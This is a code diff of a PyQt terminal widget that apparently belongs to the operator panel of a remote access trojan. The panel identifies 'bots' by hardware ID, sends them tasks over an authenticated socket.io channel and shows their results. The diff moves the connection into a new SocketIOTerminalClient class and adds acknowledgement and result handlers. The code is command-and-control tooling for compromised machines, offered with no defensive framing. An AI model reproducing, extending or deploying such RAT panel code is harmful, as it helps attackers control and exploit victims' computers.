@@ -7,6 +7,8 @@ import json
 from datetime import datetime
 import socketio
 
+from service.socket_io_terminal import SocketIOTerminalClient
+
 
 class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
     def __init__(self, bot, url, token, namespace):
@@ -16,21 +18,20 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         self.url = url
         self.token = token
         self.namespace = namespace
-        self.socket_io_client = socketio.Client()
-        try:
-            self.socket_io_client.connect(self.url, headers={'Authorization': f'###### {token}', 'Content-Type': 'application/json'}, namespaces=self.namespace)
-            self.update_bot_terminal("Terminal has been initialized connection")
-        except Exception as e:
-            self.update_bot_terminal(f'{str(e)}')
-
-        self.socket_io_client.on('disconnect', self._on_disconnect)
-        self.bot_event = f'panel_terminal_bot_task_result_{self.bot["hwid"]}'
-        self.socket_io_client.on(self.bot_event, self.server_update_bot_terminal)
+        self.socket_io_client = SocketIOTerminalClient(self.bot)
 
         self.setWindowIcon(QIcon(":/assets/images/rat.png"))
         self.task_result_text_browser.setStyleSheet("background-color: #000000;")
         self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
         self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")
+
+
+        self.socket_io_client.server_ack.connect(self.server_ack_bot_terminal)
+        self.socket_io_client.server_ack_result.connect(self.server_update_bot_terminal)
+
+        self.socket_io_client.connected_to_server.connect(self.init_terminal)
+
+        self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
         # command = ['help', 'cd', 'pwd', 'mkdir', 'start']
@@ -47,6 +48,10 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
 
         
         self.task_result_text_browser.setFocusPolicy(Qt.FocusPolicy.NoFocus)
+
+
+    def init_terminal(self, data):
+        self.update_bot_terminal(data)
 
     def handle_bot_comamnd(self):
         text = self.bot_send_task_line_edit.text()
@@ -71,7 +76,7 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
             "file": "" 
         }
         try:
-            self.socket_io_client.emit('panel_send_bot_task', bot_task)
+            self.socket_io_client.send_command('panel_send_bot_task', bot_task)
         except Exception as e:
             self.update_bot_terminal(f'{str(e)}')
 
@@ -82,23 +87,30 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
 
     def closeEvent(self, event):
         # self.socket_io_client.socket_io.off(self.bot_event)
-        self.socket_io_client.disconnect()
+        self.socket_io_client.stop()
         PattayaPanelUtil.terminals.pop(self.bot['hwid'])
         PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")
     
     
-    def server_update_bot_terminal(self, text):
+    def server_ack_bot_terminal(self, text):
         self.bot_send_task_line_edit.setDisabled(False)
         self.bot_send_task_line_edit.setFocus()
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text['message']}</font><br>")
+        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text}</font>")
+        self.task_result_text_browser.ensureCursorVisible()
+
+
+    def server_update_bot_terminal(self, result):
+        current_time = datetime.now()
+        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
+        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {result}</font><br>")
         self.task_result_text_browser.ensureCursorVisible()
 
     def update_bot_terminal(self, command):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {command}</font>")
+        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'><<<</font></font><font color='#00E3FA'> {command}</font>")
         self.task_result_text_browser.ensureCursorVisible()
 
 
